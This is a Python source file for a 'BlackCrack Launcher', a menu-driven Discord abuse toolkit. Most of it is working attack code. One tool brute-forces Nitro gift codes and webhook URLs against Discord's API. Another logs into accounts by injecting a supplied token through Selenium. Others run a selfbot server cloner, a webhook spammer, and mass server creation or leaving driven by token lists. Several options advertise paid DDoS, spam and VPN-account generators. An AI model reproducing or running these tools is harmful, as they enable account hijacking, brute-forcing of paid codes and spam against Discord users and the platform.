import ctypes
import httpx
import time
import string
import discord
import requests
import webbrowser
import os.path
import ipaddress
import re
import threading
import socket
import json
import asyncio
import sys, time
from sys import stdout
import colorama
from colorama import Back, Fore, Style, init
from time import sleep
from requests.api import options
from datetime import datetime
from aiohttp import web
import tkinter as tk
from aiohttp import web
from discord.ext import commands
import random, discord_webhook, fade
from pip._internal import commands
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pypresence import Presence
from discord_webhook import DiscordWebhook, DiscordEmbed
import tkinter as tk
from tkinter import filedialog




rpc = Presence("1028307148867911731")
rpc.connect()
rpc.update(state="Using BlackLauncherFREE",details="BlackCrackOnTop!", large_image="blackcrack", buttons=[{"label": "Discord","url":"https://discord.gg/V7JetCEKF7"}])

os.system("color b")
colorama.init(autoreset=True)
os.system('title BlackCrackLauncher v 0.1.3  by godclicks#5105 BIgBadApache#1723')

print(Fore.RED + "  ____  _            _     _____                _    ")
print(Fore.RED + " |  _ \| |          | |   / ____|              | |   ")
print(Fore.RED + " | |_) | | __ _  ___| | _| |     _ __ __ _  ___| | __")
print(Fore.RED + " |  _ <| |/ _` |/ __| |/ / |    | '__/ _` |/ __| |/ /")
print(Fore.RED + " | |_) | | (_| | (__|   <| |____| | | (_| | (__|   < ")
print(Fore.RED + " |____/|_|\__,_|\___|_|\_\\_____|_|  \__,_|\___|_|\_\ ")
print("")
print(Fore.GREEN + "https://discord.gg/V7JetCEKF7")
print("")
print(Fore.RED + "BlackCrack Launcher Free Version")
print("")
print(Fore.GREEN + "[*] = Free")
print(Fore.GREEN + "[!] = Paid")
print("")
print(Fore.CYAN + "1. [*] NitroGenerator         |      5. [*] DcToken Login    |       9. [!] Token Spammer    |       13. [*] Mass Servercreate")
print(Fore.CYAN + "                              |                              |                               |")
print(Fore.CYAN + "2. [*] PscGenerator           |      6. [*] Discord Cloner   |       10. [*] Webhook Spotter |       14. [!] DM Spammer")
print(Fore.CYAN + "                              |                              |                               |")
print(Fore.CYAN + "3. [!] DDos-Tool              |      7. [!] Port Scanner     |       11. [*] Webhook Spammer |       15. Credits")
print(Fore.CYAN + "                              |                              |                               |")
print(Fore.CYAN + "4. [*] Pinger                 |      8. [!] Nordvpn Gen      |       12. [*] TServerleaver   |")
print(Fore.CYAN + "                              |                              |                               |")






nitro = 1
psc = 2
ddos = 3
pingfr = 4
tlogin = 5
dcloner = 6
pscan = 7
nordgen = 8
tspammer = 9
wspotter = 10
wspammer = 11
tSleaver = 12
Smasscreate = 13
DMspam = 14
Credits = 15

Black = int(input("/:"))


if Black == 1:
    os.system("cls")
    LICNESE = """
    made by godclicks#0001
    """

    USE_WEBHOOK = True

    print(LICNESE)

    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')

    try:
        from discord_webhook import DiscordWebhook
    except ImportError:
        input(
            f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to continue.")
        USE_WEBHOOK = False
    try:
        import requests
    except ImportError:
        input(
            f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")
        exit()
    try:
        import numpy
    except ImportError:
        input(
            f"Module numpy not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install numpy'\nPress enter to exit")
        exit()

    url = "https://github.com"
    try:
        response = requests.get(url)
        print("Internet check")
        time.sleep(.4)
    except requests.exceptions.ConnectionError:
        input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
        exit()


    class NitroGen:
        def __init__(self):
            self.fileName = "Nitro Codes.txt"

        def main(self):
            os.system('cls' if os.name == 'nt' else 'clear')
            if os.name == "nt":
                print("")
                ctypes.windll.kernel32.SetConsoleTitleW(
                    "Discord Nitro checker made by godclicks")
            else:
                print(f'\33]0; nitro gen and checker - Made by Godclicks <3\a',
                      end='', flush=True)

            print(""" 
                        _   _ _ _              _____            
                       | \ | (_) |            / ____|           
                       |  \| |_| |_ _ __ ___ | |  __  ___ _ __  
                       | . ` | | __| '__/ _ \| | |_ |/ _ \ '_ \ 
                       | |\  | | |_| | | (_) | |__| |  __/ | | |
                       |_| \_|_|\__|_|  \___/ \_____|\___|_| |_|


                                                            """)
            time.sleep(2)
            self.slowType("Made by: godclicks", .02)
            time.sleep(1)
            self.slowType(
                "\nInput Wie viel willst du überprüfen und generieren? : ", .02, newLine=False)

            try:
                num = int(input(''))
            except ValueError:
                input("Specified input wasn't a number.\nPress enter to exit")
                exit()

            if USE_WEBHOOK:
                self.slowType(
                    "Wenn du die Nitro Infos an eine  Discord webhook senden willst ,schicke hier den link rein oder drücke Enter wenn du es nicht willst : ",
                    .02, newLine=False)
                url = input('')
                webhook = url if url != "" else None

                if webhook is not None:
                    DiscordWebhook(
                        url=url,
                        content=f"```Started checking urls\nI will send any valid codes here```"
                    ).execute()

            valid = []
            invalid = 0
            chars = []
            chars[:0] = string.ascii_letters + string.digits

            c = numpy.random.choice(chars, size=[num, 23])
            for s in c:
                try:
                    code = ''.join(x for x in s)
                    url = f"https://discord.gift/{code}"

                    result = self.quickChecker(url, webhook)

                    if result:
                        valid.append(url)
                    else:
                        invalid += 1
                except KeyboardInterrupt:
                    print("\nInterrupted by user")
                    break

                except Exception as e:
                    print(f" Error | {url} ")

                if os.name == "nt":
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - godclicks <3")
                    print("")
                else:
                    print(
                        f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by godclicks\a',
                        end='', flush=True)

            print(f"""
    Results:
     Valid: {len(valid)}
     Invalid: {invalid}
     Valid Codes: {', '.join(valid)}""")
            input("\nDrücke Enter zum Beenden!")
            [input(i) for i in range(0, 0, -1)]

        def slowType(self, text: str, speed: float, newLine=True):
            for i in text:
                print(i, end="", flush=True)
                time.sleep(speed)
            if newLine:
                print()

        def quickChecker(self, nitro: str, notify=None):
            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)

            if response.status_code == 200:
                print(f" Valid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                with open("Nitro Codes.txt", "w") as file:
                    file.write(nitro)

                if notify is not None:
                    DiscordWebhook(
                        url=url,
                        content=f"Valid Nito Code detected! @everyone \n{nitro}"
                    ).execute()

                return True
            else:
                print(f" Invalid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                return False


    if __name__ == '__main__':
        Gen = NitroGen()
        Gen.main()

elif Black == 2:


    colors_list = ["ff0000", "b164da", "e4cb84"]

    red = colorama.Fore.RED
    blue = colorama.Fore.BLUE
    white = colorama.Fore.WHITE
    green = colorama.Fore.GREEN
    reset = colorama.Fore.RESET

    os.system("@mode con cols=80 lines=20")

    banner = """
         _____   _____  _____    _____            
        |  __ \ / ____|/ ____|  / ____|           
        | |__) | (___ | |      | |  __  ___ _ __  
        |  ___/ \___ \| |      | | |_ |/ _ \ '_ \ 
        | |     ____) | |____  | |__| |  __/ | | |
        |_|    |_____/ \_____|  \_____|\___|_| |_|



    """
    banner = fade.pinkred(banner)

    os.system("cls")
    print(banner)
    input_webhook = input(f"[{green}+{reset}] Webhook URL: ")


    def main():
        while True:
            code = random.randint(100000000000000, 999999999999999)
            os.system("cls")
            print(banner)
            print(f"                     [{green}+{reset}] New Code: {blue}{code}{reset}")
            time.sleep(0.5)
            webhook = DiscordWebhook(url=input_webhook)
            embed = DiscordEmbed(title='PSC Generator', description=f"`➕` Code: 0{code}",
                                 color=random.choice(colors_list))
            webhook.add_embed(embed)
            time.sleep(0.5)
            response = webhook.execute()


    main()


elif Black == 3:
    print(Fore.RED + "This is a Thing from the Paid Version! ")
    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
    sleep(5)
    os.system("cls")
    os.system("main.py")
    sys.exit()
elif Black == 4:
    def ipping():
        os.system("cls")
        count = 1
        e = input("Enter IP Address:   ")
        replies = 0
        replies += 1
        hostname = e
        os.system("cls")
        print("-" * 100)
        print("=" * 100)
        print("-" * 100)
        while True:
            response = os.system(
                "ping -n 1 " + hostname + " [insert angled bracket here because youtube description won't let me]nul")
            if response == 0:
                print("\033[1;32;40m" + hostname + " is online!" + " [" + str(count) + "]" + '\033[0m')
            else:
                print("\033[31m" + hostname + " is offline!" " [" + str(count) + "]" + '\033[0m')
            count += 1
            time.sleep(2)


    ipping()

elif Black == 5:
    os.system("cls")
    print("""
      _______    _              _                 _       
     |__   __|  | |            | |               (_)      
        | | ___ | | _____ _ __ | |     ___   __ _ _ _ __  
        | |/ _ \| |/ / _ \ '_ \| |    / _ \ / _` | | '_ \ 
        | | (_) |   <  __/ | | | |___| (_) | (_| | | | | |
        |_|\___/|_|\_\___|_| |_|______\___/ \__, |_|_| |_|
                                             __/ |        
                                            |___/         
    """)

    token = input('Token: ')
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    driver = webdriver.Chrome('chromedriver.exe')
    driver.get('https://discord.com/login')
    js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
    time.sleep(3)
    driver.execute_script(js + f'login("{token}")')

elif Black == 6:
    init()
    os.system("cls")

    token = input('{}\n[>] {} TOKEN: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
    prefix = input('{}\n[>] {} PREFIX: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
    client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                          self_bot=True)

    client.remove_command('help')
    header = {"Authorization": f'Bot {token}'}
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('cls' if os.name == 'nt' else 'clear')

    intents = discord.Intents.all()
    intents.members = True


    @client.event
    async def on_ready():
        print('------')
        print('{}\n[>] {} Selfbot running... {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
        print('{}\n[>] {} Command:{} {}copyserver\n'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET, prefix))
        print('     - Logged in as ' + client.user.name)
        print('     - User ID: ' + str(client.user.id))
        print('\n------\n')


    @client.command()
    async def copyserver(ctx):
        await ctx.message.delete()
        wow = await client.create_guild(f'backup-{ctx.guild.name}')
        await asyncio.sleep(4)
        for g in client.guilds:
            if f'backup-{ctx.guild.name}' in g.name:
                for c in g.channels:
                    await c.delete()
                for cate in ctx.guild.categories:
                    x = await g.create_category(f"{cate.name}")
                    for chann in cate.channels:
                        if isinstance(chann, discord.VoiceChannel):
                            await x.create_voice_channel(f"{chann}")
                        if isinstance(chann, discord.TextChannel):
                            await x.create_text_channel(f"{chann}")
                print(ctx.guild.roles)
        for role in ctx.guild.roles[::-1]:
            if role.name != "@everyone":
                try:
                    await wow.create_role(name=role.name, color=role.color, permissions=role.permissions,
                                          hoist=role.hoist, mentionable=role.mentionable)
                    print(f"Created new role : {role.name}")
                except:
                    break


    client.run(token, bot=False)

elif Black == 7:
    print(Fore.RED + "This is a Thing from the Paid Version! ")
    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
    sleep(5)
    os.system("cls")
    os.system("main.py")
    sys.exit()
elif Black == 8:
    print(Fore.RED + "This is a Thing from the Paid Version! ")
    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
    sleep(5)
    os.system("cls")
    os.system("main.py")
    sys.exit()
elif Black == 9:
    print(Fore.RED + "This is a Thing from the Paid Version! ")
    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
    sleep(5)
    os.system("cls")
    os.system("main.py")
    sys.exit()
elif Black == 10:
    error = False
    import os, threading
    import sys, time


    def print(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)
        sys.stdout.write("\n")


    def print(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)


    try:
        import colorama, requests
    except:
        sys.stdout.write("> ")
        print("Missing Required Modules, Press Enter To Download (May Not Always Work)")
        input("")
        try:
            import os

            os.system("pip install colorama requests")
        except:
            pass
        sys.stdout.write("> ")
        print("Problem Maybe Fixed Now, Restart The Program")
        input("")
        exit()

    webs = []

    import random, time, threading

    colorama.init(autoreset=True)
    choice = "1234567890"
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
               "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
               "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]


    def sniper():
        global webs
        while True:
            ide = random.choices(choice, k=18)
            ide = "".join(ide)
            code = random.choices(choices, k=68)
            code = "".join(code)
            webhook = "https://discord.com/api/webhooks/" + str(ide) + "/" + str(code)
            r = requests.get(webhook)
            if "200" in str(r):
                webs.append("Valid Webhook! " + webhook)
                if save == "y":
                    valid = open("valid_webhooks.txt", "a")
                    valid.write(webhook + "\n")
                    valid.close()
            else:
                webs.append("Invalid Webhook! " + webhook)
                if save == "y":
                    invalid = open("invalid_webhooks.txt", "a")
                    invalid.write(webhook + "\n")
                    invalid.close()
            time.sleep(float(delay))


    def valid():
        sys.stdout.write(colorama.Fore.RED + "> ")
        print("Enter A Valid Choice")
        return


    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Enter How Many Threads You Want: ")
            threads = input("")
            threads = int(threads)
            break
        except:
            valid()
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Wanna Auto Save Webhooks (y/n): ")
        save = input("")
        if save == "y" or save == "n":
            break
        else:
            valid()
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Enter Delay For Each Thread (0 = No Delay): ")
            delay = input("")
            delay = float(delay)
            break
        except:
            valid()
    for u in range(int(threads)):
        threading.Thread(target=sniper).start()
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Started Thread")

    den = 0

    while True:
        for u in webs:
            webs.remove(u)
            den = int(den) + 1
            if "Invalid" in u:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print(f"Invalid Webhook {colorama.Fore.RED}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.RED}]")

            if "Valid" in u:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(f"Valid Webhook {colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]")

elif Black == 11:
    init(convert=True)
    os.system("cls")
    print("")
    print("Webhook Spammer ")
    print("")
    print("")

    webhook = input(Fore.RED + "Enter the Webhook Url: ")
    msg = input(Fore.CYAN + "Enter the message: ")
    tyme = int(input(Fore.BLUE + "Enter the number of times to spam: "))


    def proxy_spam():
        req = httpx.post(webhook, json={'content': msg}, proxies=proxy)
        if req.status_code == 204:
            print(Fore.GREEN + "Message Sent Successfully")
        else:
            print(Fore.WHITE + "Bad proxies or webhook or ratelimited")


    def proxyless_spam():
        req = httpx.post(webhook, json={'content': msg})
        if req.status_code == 204:
            print(Fore.GREEN + "Message Sent Successfully")
        else:
            print(Fore.WHITE + "Bad proxies or webhook or ratelimited")


    support = input(Fore.LIGHTYELLOW_EX + "tipe 1 to start: ")

    if support == "Y":
        for i in range(tyme):
            proxy_spam()
            os.system("start main.py")
            sys.exit()
    elif support == "1":
        for i in range(tyme):
            proxyless_spam()
    else:
        sys.exit()

elif Black == 12:
    print("The Tokens leave the server")
    def bot_leaver(guild_id, token):
        headers = {'Authorization': token}
        apilink = "https://discord.com/api/v8/users/@me/guilds/" + guild_id
        r = requests.delete(apilink, headers=headers)
        print("[!] Left server ")


    def main():
        tokens = []

        with open("tokens.txt", "r") as tokens_file:
            lines = tokens_file.readlines()
            for l in lines:
                tokens.append(l.replace('\n', ''))

        guild_id = input('[!] Enter server ID: ')

        input("Hit ENTER to leave discord server.")
        for botzz in tokens:
            bot_leaver(guild_id, botzz)


    if __name__ == "__main__":
        main()

elif Black == 13:
    def print(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)
        sys.stdout.write("\n")


    def print(text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.015)


    import os, threading


    def set_title():
        title = "Discord Mass Server Creator"
        try:
            import requests
            text = str(requests.get("https://pastebin.com/raw/vCkUFiZ8").text)
            os.system(f"title {title}{text}")
        except:
            os.system(f"title {title}")


    threading.Thread(target=set_title).start()

    try:
        import colorama, requests
    except:
        sys.stdout.write("> ")
        print("Missing Required Modules, Press Enter To Download (May Not Always Work)")
        input("")
        try:
            import os

            os.system("pip install colorama requests")
        except:
            pass
        sys.stdout.write("> ")
        print("Problem Maybe Fixed Now, Restart The Program")
        input("")
        exit()

    colorama.init(autoreset=True)

    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print("Version 1.7.3 Is The Required Version Of Discord.py, Press Enter To Start The Main Program")
    input("")

    alle = 0


    def create():
        global alle
        url = "https://discord.com/api/v9/guilds"
        json = {
            "name": name,
            "icon": None,
            "channels": [],
            "system_channel_id": None,
            "guild_template_code": None
        }
        while True:
            re = requests.post(url, headers={"authorization": tokens}, json=json)
            re = str(re)
            if "201" in re:
                break
            if "201" not in re and "429" not in re:
                break
        alle = int(alle) + 1


    def creator():
        global alle
        global name, tokens
        while True:
            try:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print("Enter Amount Of Servers To Create: ")
                amount = int(input(""))
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Enter A Valid Choice")
        invite_code = str(requests.get("https://pastebin.com/raw/9SxbfxE8").text)
        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Enter Token: ")
            tokens = input("")
            r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": tokens})
            if "200" not in str(r1):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Invalid Token")
            if "200" in str(r1):
                r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": tokens})
                if "200" in str(r):
                    break
                if "403" in str(r):
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print("Locked Token")

        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Enter What Server Name Should Be (Name Cant Only Be An Number): ")
        name = input("")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Creating Servers...")
        for u in range(int(amount)):
            threading.Thread(target=create).start()
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Started Thread")
        den = 0
        while True:
            if int(amount) == int(den):
                break
            for i in range(int(alle)):
                alle = int(alle) - 1
                den = int(den) + 1
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(
                    f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(den)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Created Server")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Done Creating Servers")
        input("")
        exit()


    creator()

elif Black == 14:
    print(Fore.RED + "This is a Thing from the Paid Version! ")
    print(Fore.RED + "create a ticket on our server to buy the Paid Version")
    sleep(5)
    os.system("cls")
    os.system("main.py")
    sys.exit()
elif Black == 15:
    os.system("cls")
    colorama.init(autoreset=True)
    print("")
    print("             [!] Credits [!]         ")
    print("")
    print("Developeteam: BlackCrack")
    print("")
    print(Fore.RED + "                             Developers:")
    print("")
    print(Fore.BLUE + "                                 godclicks#0001")
    print("")
    print(Fore.BLUE + "                                 BIgBadApache#1723")
    print("")
    print("")
    print(Fore.CYAN + "Cool Dudes: ")
    print("")
    print(Fore.CYAN + "MxGTA#1746")
    print("")
    print(Fore.CYAN + "Bxnkq#6284")
    print("")
    print(Fore.CYAN + "Reddy#8613")
    print("")
    print(Fore.CYAN + "Cookie#7201")
    print("")
    print(Fore.BLUE + "Github: https://github.com/OfficialBlackCrack")
    print("")
    print(Fore.BLUE + "Discord:  https://discord.gg/V7JetCEKF7")
    print("")
    print(Fore.LIGHTYELLOW_EX + "GTA V Mod Menu Discord from [ Mr X ] ")
    print(Fore.LIGHTYELLOW_EX + "https://discord.gg/3TGESFBs4S")
    print("")


print("")
print("")
print("")
print("")
input("Enter...")
